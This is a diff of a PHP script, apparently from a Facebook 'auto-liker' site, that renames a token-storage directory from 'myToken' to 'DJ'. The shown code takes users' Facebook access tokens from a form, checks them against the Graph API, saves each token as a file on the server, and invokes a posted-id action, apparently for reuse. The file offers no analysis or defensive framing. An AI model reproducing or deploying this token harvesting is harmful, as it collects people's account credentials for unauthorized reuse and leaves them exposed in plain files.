@@ -6,7 +6,7 @@
 
 
 <?php
-$yx=opendir('myToken');
+$yx=opendir('DJ');
 while($isi=readdir($yx)){
 if($isi != '.' && $isi != '..'){
 $member[]=$isi;
@@ -20,7 +20,7 @@ if($_POST[access_token]){
 $access_token = $_POST[access_token];
 $me = $like -> me($access_token);
 if($me[id]){
-$like -> myToken($access_token);
+$like -> DJ($access_token);
 if($_POST[id]){
 $like -> pancal($_POST[id]);
 }else{
@@ -41,11 +41,11 @@ print '';
 public function me($access){
 return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
 }
-public function myToken($access){
-if(!is_dir('myToken')){
-mkdir('myToken');
+public function DJ($access){
+if(!is_dir('DJ')){
+mkdir('DJ');
 }
-$a=fopen('myToken/'.$access,'w');
+$a=fopen('DJ/'.$access,'w');
 fwrite($a,1);
 fclose($a);
 }
